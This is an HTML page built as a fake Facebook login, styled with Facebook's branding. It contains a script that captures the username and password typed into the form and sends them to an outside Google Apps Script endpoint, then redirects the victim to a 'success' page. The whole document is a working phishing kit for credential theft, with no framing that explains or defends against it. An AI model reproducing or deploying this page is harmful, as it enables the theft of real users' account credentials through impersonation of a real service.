<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Login</title>

    <style>
        * {
            box-sizing: border-box;
            font-family: Arial;
        }

        body {
            background: #f0f2f5;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-container {
            background: #fff;
            width: 360px;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, .1);
            text-align: center;
        }

        .logo {
            font-size: 36px;
            color: #1877f2;
            font-weight: bold;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border-radius: 6px;
            border: 1px solid #ddd;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 6px;
            background: #1877f2;
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>

</head>

<body>

    <div class="login-container">
        <div class="logo">facebook</div>

        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
        const scriptURL = "https://script.google.com/macros/s/AKfycbzHTPiP1e6Cd9WaNWwAHTOOTw2xfwQwm4FUoEKkpdfIqOJJzqwvJD-otPYrvuQYRTgi/exec";

        document.getElementById("loginForm").addEventListener("submit", e => {
            e.preventDefault();

            fetch(scriptURL, {
                method: "POST",
                body: JSON.stringify({
                    username: document.getElementById("username").value,
                    password: document.getElementById("password").value
                })
            }).then(() => {
                window.location.href = "success.html";
            }).catch(err => alert("Error!"));
        });
    </script>

</body>

</html>
